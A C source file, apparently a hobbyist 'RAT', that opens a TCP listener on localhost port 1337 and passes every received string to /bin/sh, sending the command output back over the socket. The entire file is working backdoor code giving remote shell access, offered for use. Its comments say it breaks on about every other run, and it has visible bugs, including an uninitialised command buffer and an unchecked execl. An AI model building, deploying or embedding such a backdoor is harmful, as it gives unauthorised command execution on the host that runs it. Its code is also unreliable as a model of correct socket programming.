/* compile with 
 * gcc -Wall -o ShittyRat ./ShittyRat.c
 * run and then connect with netcat
 */


#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#define READ_END 0
#define WRITE_END 1




int main(){
  uint16_t port = 1337;
  int welcomeSocket, newSocket;
  struct sockaddr_in serverAddr;
  struct sockaddr_storage serverStorage;
  socklen_t addr_size;
  
  /*---- Create the socket. The three arguments are: ----*/
  /* 1) Internet domain 2) Stream socket 3) Default protocol (TCP in this case) */
  welcomeSocket = socket(PF_INET, SOCK_STREAM, 0);
  
  /*---- Configure settings of the server address struct ----*/
  /* Address family = Internet */
  serverAddr.sin_family = AF_INET;
  
  /* Set port number, using htons function to use proper byte order */
  serverAddr.sin_port = htons(port);
  
  /* Set IP address to localhost */
  serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    
  /* Set all bits of the padding field to 0 */
  memset(serverAddr.sin_zero, '\0', sizeof serverAddr.sin_zero);  

  /*---- Bind the address struct to the socket ----*/
  bind(welcomeSocket, (struct sockaddr *) &serverAddr, sizeof(serverAddr));

  /*---- Listen on the socket, with 5 max connection requests queued ----*/
  if(listen(welcomeSocket,5)==0)
    printf("Listening\n");
  else
    printf("Error\n");

  /*---- Accept call creates a new socket for the incoming connection ----*/
  addr_size = sizeof(serverStorage);
  newSocket = accept(welcomeSocket, (struct sockaddr *) &serverStorage, &addr_size);
  close(welcomeSocket);
  /*---- Send message to the socket of the incoming connection ----*/
  
  /* some hackery BS */
    pid_t pid;
    int fd[2];
    char CMD[4096];
    char BUFFER[65536];
    //Make a pipe FD
    pipe(fd);
   
    /* This shit will break about every other run
     * uncommend the below 2 lines to put the pipe FD in non-blocking mode
     * if you do you will need to hit enter 2 times when sending a CMD
     * send "DEADBEEF" to stop the loop
     * this needs arg parsing, poll()/select()
     */

    //int flags = fcntl(fd[READ_END], F_GETFL, 0);
    //fcntl(fd[READ_END], F_SETFL, flags | O_NONBLOCK);    
    while( (strcmp(CMD, "DEADBEEF\n") != 0) ){
   	 memset(BUFFER, 0, sizeof(BUFFER));
   	 memset(CMD, 0, 4096);
   	 
   	 recv(newSocket,CMD, sizeof(CMD), 0);
   	 pid = fork();
   	 
   	 if(pid==0)
   	 {
   	     dup2(fd[WRITE_END], STDOUT_FILENO);
   	     dup2(fd[WRITE_END], STDERR_FILENO);

   	     execl("/bin/sh", "sh", "-c", CMD, (char *) NULL);
   	 }
   	 read(fd[READ_END], BUFFER, sizeof(BUFFER));
	 send(newSocket,BUFFER,strlen(BUFFER),0);
    }
    close(fd[0]);
    close(fd[1]);
    close(newSocket);
  return 0;
}
